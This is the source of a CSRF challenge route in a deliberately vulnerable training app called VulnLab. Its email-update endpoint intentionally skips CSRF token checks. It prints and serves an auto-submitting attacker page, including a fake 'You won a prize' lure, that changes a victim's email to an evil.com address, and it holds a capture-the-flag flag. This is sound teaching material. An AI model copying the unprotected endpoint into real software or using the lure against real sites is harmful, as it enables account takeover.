/**
 * VulnLab — CSRF Lab
 * Challenge: Forge a cross-site request to change a victim's email.
 * The form has NO CSRF token and does NOT check the Referer header.
 */

const express = require("express");
const router  = express.Router();
const { getDB } = require("../db/seed");

const layout = (title, body) => `<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>${title} — VulnLab</title>
<style>
  * { box-sizing:border-box; }
  body { background:#0d1117;color:#c9d1d9;font-family:monospace;margin:0; }
  header { background:#161b22;border-bottom:1px solid #30363d;padding:1rem 2rem; }
  header a { color:#58a6ff;text-decoration:none; }
  main { max-width:800px;margin:2rem auto;padding:0 1rem; }
  h2 { color:#58a6ff; }
  .hint { background:#1c2128;border-left:3px solid #d29922;padding:0.75rem 1rem;margin:1rem 0;border-radius:0 6px 6px 0;font-size:0.85rem;color:#e3b341; }
  .success { background:#0d2d0d;border-left:3px solid #3fb950;padding:0.75rem 1rem;margin:1rem 0;color:#3fb950;border-radius:0 6px 6px 0; }
  input { width:100%;padding:0.5rem;background:#21262d;border:1px solid #30363d;color:#c9d1d9;border-radius:4px;margin-top:0.3rem;font-family:monospace; }
  button { padding:0.5rem 1.5rem;background:#1f6feb;color:#fff;border:none;border-radius:6px;cursor:pointer;margin-top:0.5rem; }
  .card { background:#161b22;border:1px solid #30363d;border-radius:8px;padding:1.25rem;margin:1rem 0; }
  code { background:#21262d;padding:0.1rem 0.4rem;border-radius:3px;color:#79c0ff; }
  pre { background:#21262d;padding:1rem;border-radius:6px;font-size:0.8rem;color:#c9d1d9;margin-top:0.5rem;overflow-x:auto; }
</style>
</head>
<body>
<header><a href="/">⚠ VulnLab</a> &nbsp;›&nbsp; <a href="/csrf">CSRF Lab</a></header>
<main>${body}</main>
</html>`;

// ── Email update form (victim page) ───────────────────────────────────────────
router.get("/", (req, res) => {
  const user = req.session.user;
  const db   = getDB();
  const dbUser = user ? db.prepare("SELECT * FROM users WHERE username=?").get(user.username) : null;

  res.send(layout("CSRF Lab", `
    <h2>CSRF Lab — Email Update</h2>

    <div class="hint">
      💡 <strong>Hint:</strong> This form has NO CSRF token. An attacker can craft a malicious page
      that auto-submits this form when a logged-in victim visits it.<br><br>
      1. Login as <strong>alice</strong> (crack her MD5 hash first)<br>
      2. While logged in, open the CSRF PoC below in another tab<br>
      3. The PoC auto-submits a form to change alice's email without her knowledge
    </div>

    ${dbUser ? `
    <div class="card">
      <strong>Your current email:</strong> ${dbUser.email || "(none)"}
    </div>
    <form method="POST" action="/csrf/update-email">
      <label>New email:</label>
      <input type="email" name="email" value="${dbUser.email || ""}">
      <button type="submit">Update Email</button>
    </form>
    ` : `<div class="card"><p style="color:#8b949e">You are not logged in. <a href="/auth/login" style="color:#58a6ff">Login first</a> to see the victim page.</p></div>`}

    <hr style="border-color:#30363d;margin:2rem 0">
    <h3 style="color:#e3b341">CSRF Proof of Concept (attacker's page)</h3>
    <div class="card">
      <p style="color:#8b949e;margin-bottom:1rem">This HTML, hosted on <em>any other domain</em>, auto-submits when a logged-in victim visits it:</p>
      <pre>&lt;!-- attacker.html — hosted on evil.com --&gt;
&lt;html&gt;
&lt;body onload="document.forms[0].submit()"&gt;
  &lt;form action="http://localhost:8080/csrf/update-email" method="POST" style="display:none"&gt;
    &lt;input name="email" value="attacker@evil.com"&gt;
  &lt;/form&gt;
  &lt;p&gt;Loading amazing content...&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
      <a href="/csrf/poc" target="_blank" style="color:#f85149">▶ Open Live PoC (auto-submits!)</a>
    </div>
  `));
});

// ── Email update endpoint ─────────────────────────────────────────────────────
router.post("/update-email", (req, res) => {
  const user = req.session.user;
  if (!user) {
    return res.redirect("/auth/login");
  }

  const newEmail = req.body.email || "";
  const db = getDB();

  // INTENTIONAL VULNERABILITY: no CSRF token check
  db.prepare("UPDATE users SET email=? WHERE username=?").run(newEmail, user.username);

  const isAttackerEmail = newEmail.includes("evil") || newEmail.includes("attacker") || req.get("Referer")?.includes("/csrf/poc");

  res.send(layout("Email Updated", `
    <h2>CSRF Lab — Email Updated</h2>
    <div class="success">
      ✅ Email changed to: <strong>${newEmail}</strong><br>
      ${isAttackerEmail ? `<br>🚩 CSRF attack succeeded! Flag: <strong>VULNLAB{CSRF_N0_T0K3N_S0RRY}</strong>` : ""}
    </div>
    <p><a href="/csrf" style="color:#58a6ff">← Back</a></p>
  `));
});

// ── Live CSRF PoC ─────────────────────────────────────────────────────────────
router.get("/poc", (req, res) => {
  // INTENTIONAL: simulates attacker's cross-origin page
  res.send(`<!DOCTYPE html>
<html>
<head><title>You won a prize! 🎉</title></head>
<body onload="document.forms[0].submit()" style="font-family:sans-serif;text-align:center;padding:3rem;background:#fff;color:#333">
  <h1>🎉 Congratulations!</h1>
  <p>You've won a free subscription! Claiming your prize...</p>
  <form action="/csrf/update-email" method="POST" style="display:none">
    <input name="email" value="hacked@attacker.evil">
  </form>
  <p style="font-size:0.8rem;color:#999">(This is the CSRF Proof of Concept from VulnLab)</p>
</body>
</html>`);
});

module.exports = router;
